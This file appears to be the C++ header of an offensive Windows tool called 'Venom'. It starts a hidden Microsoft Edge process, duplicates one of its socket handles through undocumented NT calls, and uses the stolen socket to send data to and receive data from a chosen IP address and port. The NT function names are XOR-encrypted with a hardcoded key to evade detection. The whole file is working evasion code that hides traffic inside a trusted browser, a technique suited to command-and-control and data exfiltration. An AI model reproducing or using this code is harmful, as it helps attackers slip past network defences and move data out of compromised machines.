#pragma once

#include "pch.h"

// Constants
#define WS2_32_VERSION				MAKEWORD(2, 2)
#define SystemHandleInformation		0x10
#define ObjectNameInformation		1
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xc0000004L)


// run VenomEnc.py with random key for 
// encrypting function names:
// NtDuplicateObject, NtQuerySystemInformation and NtQueryObject

// XOR encrypted NtDuplicateObject
unsigned char cNtDuplicateObj[] = { 0x16, 0x11, 0x12, 0x14, 0x3e, 0x2, 0xf, 0x14, 0x8, 0x22, 0x3f, 0x0, 0xe, 0x18, 0xc, 0x4, 0x37 };
unsigned int cNtDuplicateObjLen = sizeof(cNtDuplicateObj);

// XOR encrypted NtQuerySystemInformation
unsigned char cNtQuerySysInfo[] = { 0x16, 0x11, 0x7, 0x14, 0x2b, 0x1c, 0x1f, 0x24, 0x10, 0x25, 0x2e, 0x2a, 0x1, 0x3b, 0x7, 0x1, 0x2c, 0x28, 0x34, 0x2c, 0x2c, 0xc, 0x39, 0xf };
unsigned int cNtQuerySysInfoLen = sizeof(cNtQuerySysInfo);

// XOR encrypted NtQueryObject
unsigned char cNtQueryObj[] = { 0x16, 0x11, 0x7, 0x14, 0x2b, 0x1c, 0x1f, 0x38, 0xb, 0x3c, 0x3f, 0x2c, 0x18 };
unsigned int cNtQueryObjLen = sizeof(cNtQueryObj);

// encrypt/decrypt key
char mySecretKey[] = "XeVaNnfwiVZOlrigCZYM";

// Structs.
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	ULONG   UniqueProcessId;
	UCHAR   ObjectTypeIndex;
	UCHAR   HandleAttributes;
	USHORT  HandleValue;
	PVOID   Object;
	ULONG   GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG                           NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO  Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION
{
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, * POBJECT_NAME_INFORMATION;

typedef long (NTAPI* pNtDuplicateObject)(
	HANDLE      SourceProcessHandle,
	HANDLE      SourceHandle,
	HANDLE      TargetProcessHandle,
	PHANDLE     TargetHandle,
	ACCESS_MASK DesiredAccess,
	BOOLEAN     InheritHandle,
	ULONG       Options
);

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
	ULONG   SystemInformationClass,
	PVOID   SystemInformation,
	ULONG   SystemInformationLength,
	PULONG  ReturnLength
);

typedef NTSTATUS(NTAPI* pNtQueryObject)(
	HANDLE                   Handle,
	OBJECT_INFORMATION_CLASS ObjectInformationClass,
	PVOID                    ObjectInformation,
	ULONG                    ObjectInformationLength,
	PULONG                   ReturnLength
);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}



class Venom {
public:
	Venom(std::wstring ipAddress, int port) {
		socket = INVALID_SOCKET;
		hEdgeProccess = NULL;
		initialized = true;

		// Creating a valid target.
		targetAddress.sin_family = AF_INET; 
		InetPton(AF_INET, ipAddress.c_str(), &targetAddress.sin_addr.s_addr);
		targetAddress.sin_port = htons(port);

		// Enable the usage of WS2_32 functions.
		if (WSAStartup(WS2_32_VERSION, &wsaData) == SOCKET_ERROR) {
			std::cerr << "[ - ] Could not initialize the usage of sockets: " << WSAGetLastError() << std::endl;
			initialized = false;
		}
	}

	~Venom() {
		if (socket != INVALID_SOCKET)
			closesocket(socket);
		if (hEdgeProccess)
			TerminateProcess(hEdgeProccess, 0);
	}

	/*
	* Description:
	* VenomObtainSocket is responsible for creating a browser process (edge) with no window and steal one of its sockets.
	*
	* Parameters:
	* There are no parameters.
	*
	* Returns:
	* @success [bool] -- Whether it successfully obtained socket or not.
	*/
	bool VenomObtainSocket() {
		STARTUPINFO				   startupInfo;
		PROCESS_INFORMATION		   processInfo;
		ULONG					   returnLength;
		bool					   success		   = false;
		PSYSTEM_HANDLE_INFORMATION sysHandleInfo   = NULL;
		POBJECT_NAME_INFORMATION   objNameInfo     = NULL;
		ULONG					   sysInfoLen	   = 1;
		ULONG					   objInfoLen	   = 1;
		WSAPROTOCOL_INFOW		   wsaProtocolInfo = { 0 };
		HANDLE					   targetHandle	   = INVALID_HANDLE_VALUE;
		PCWSTR					   deviceAfd	   = L"\\Device\\Afd";
		std::wstring			   processName	   = LR"(C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window)";

		if (!initialized)
			return false;

		// Loading the required functions.
		HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

		if (!hNtdll)
			return false;

		XOR((char *) cNtDuplicateObj, cNtDuplicateObjLen, mySecretKey, sizeof(mySecretKey));
		pNtDuplicateObject NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hNtdll, cNtDuplicateObj);

		XOR((char *) cNtQuerySysInfo, cNtQuerySysInfoLen, mySecretKey, sizeof(mySecretKey));
		pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(hNtdll, cNtQuerySysInfo);

		XOR((char *) cNtQueryObj, cNtQueryObjLen, mySecretKey, sizeof(mySecretKey));
		pNtQueryObject NtQueryObject = (pNtQueryObject)GetProcAddress(hNtdll, cNtQueryObj);

		if (!NtDuplicateObject || !NtQuerySystemInformation || !NtQueryObject) {
			CloseHandle(hNtdll);
			std::cerr << "[ - ] Failed to load critical functions: " << GetLastError() << std::endl;
			return false;
		}

		// Creating an edge process without window.
		ZeroMemory(&startupInfo, sizeof(startupInfo));
		startupInfo.cb = sizeof(startupInfo);
		ZeroMemory(&processInfo, sizeof(processInfo));

		if (!CreateProcess(NULL, &processName[0], NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInfo)) {
			CloseHandle(hNtdll);
			std::cerr << "[ - ] Failed to create process: " << GetLastError() << std::endl;
			return false;
		}
		CloseHandle(processInfo.hThread);
		hEdgeProccess = processInfo.hProcess;
		std::cout << "[ + ] Created detached hidden msedge process: " << processInfo.dwProcessId << std::endl;
		Sleep(1000);

		// Getting the process' handle table.
		sysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(sysInfoLen * sizeof(UCHAR));

		if (!sysHandleInfo) {
			CloseHandle(hNtdll);
			std::cerr << "[ - ] Failed to allocate sysHandleInfo: " << GetLastError() << std::endl;
			return false;
		}

		while (NtQuerySystemInformation(SystemHandleInformation,
			sysHandleInfo,
			sysInfoLen,
			&returnLength) == STATUS_INFO_LENGTH_MISMATCH) {

			free(sysHandleInfo);
			sysInfoLen = returnLength;
			sysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(sysInfoLen * sizeof(UCHAR));

			if (!sysHandleInfo) {
				CloseHandle(hNtdll);
				std::cerr << "[ - ] Failed to allocate sysHandleInfo: " << GetLastError() << std::endl;
				return false;
			}
		}

		for (ULONG i = 0; i < sysHandleInfo->NumberOfHandles; i++) {
			if (sysHandleInfo->Handles[i].ObjectTypeIndex == 0x24)
				continue;

			// Duplicating the handle from the target process.
			if (!NT_SUCCESS(NtDuplicateObject(processInfo.hProcess,
				(HANDLE)sysHandleInfo->Handles[i].HandleValue,
				GetCurrentProcess(),
				&targetHandle,
				PROCESS_ALL_ACCESS,
				FALSE,
				DUPLICATE_SAME_ACCESS)))
				continue;

			// Getting the object's name.
			objNameInfo = (POBJECT_NAME_INFORMATION)malloc(objInfoLen * sizeof(UCHAR));

			if (!objNameInfo) {
				std::cerr << "[ - ] Failed to allocate objNameInfo: " << GetLastError() << std::endl;
				success = false;
				break;
			}

			while (NtQueryObject(targetHandle,
				(OBJECT_INFORMATION_CLASS)ObjectNameInformation,
				objNameInfo,
				objInfoLen,
				&returnLength) == STATUS_INFO_LENGTH_MISMATCH) {

				free(objNameInfo);
				objInfoLen = returnLength;
				objNameInfo = (POBJECT_NAME_INFORMATION)malloc(objInfoLen * sizeof(UCHAR));

				if (!objNameInfo) {
					std::cerr << "[ - ] Failed to allocate objNameInfo: " << GetLastError() << std::endl;
					success = false;
					break;
				}
			}

			// If it is a socket, duplicate it.
			if ((objNameInfo->Name.Length / 2) == wcslen(deviceAfd)) {
				if ((wcsncmp(objNameInfo->Name.Buffer, deviceAfd, wcslen(deviceAfd)) == 0)) {
					std::cout << "[ + ] Found socket object." << std::endl;

					if (WSADuplicateSocket((SOCKET)targetHandle, GetCurrentProcessId(), &wsaProtocolInfo) == SOCKET_ERROR) {
						std::cerr << "[ - ] Failed to duplicate socket: " << WSAGetLastError() << std::endl;
						continue;
					}

					socket = WSASocket(wsaProtocolInfo.iAddressFamily,
						wsaProtocolInfo.iSocketType,
						wsaProtocolInfo.iProtocol,
						&wsaProtocolInfo,
						0,
						WSA_FLAG_OVERLAPPED);
					success = true;
					break;
				}
			}
		}

		// Cleanup handle table related variables and handles.
		if (objNameInfo) {
			free(objNameInfo);
			objNameInfo = NULL;
		}

		if (sysHandleInfo) {
			free(sysHandleInfo);
			sysHandleInfo = NULL;
		}

		if (success)
			std::cout << "[ + ] Duplicated socket." << std::endl;
		return success;
	}

	/*
	* Description:
	* VenomSendData is responsible for sending data with the stolen socket.
	*
	* Parameters:
	* @data	     [string] -- Data to send, in string format.
	*
	* Returns:
	* @errorCode [int]    -- SOCKET_ERROR if failed, else total of bytes sent.
	*/
	int VenomSendData(std::string data) {
		if (!initialized)
			return SOCKET_ERROR;

		return sendto(socket, data.c_str(), data.length(), 0, (SOCKADDR*) & targetAddress, sizeof(targetAddress));
	}

	/*
	* Description:
	* VenomReceiveData is responsible for receiving data with the stolen socket.
	*
	* Parameters:
	* @data	     [string] -- Buffer to store the received value.
	* @len		 [int]	  -- Size to expect.
	*
	* Returns:
	* @errorCode [int]    -- SOCKET_ERROR if failed, total of bytes received on success and if the connection is close 0.
	*/
	int VenomReceiveData(char* data, int len) {
		if (!initialized)
			return SOCKET_ERROR;

		return recv(socket, data, len, 0);
	}

private:
	bool			   initialized;
	WSADATA			   wsaData;
	HANDLE			   hEdgeProccess;
	struct sockaddr_in targetAddress;
	SOCKET			   socket;
};
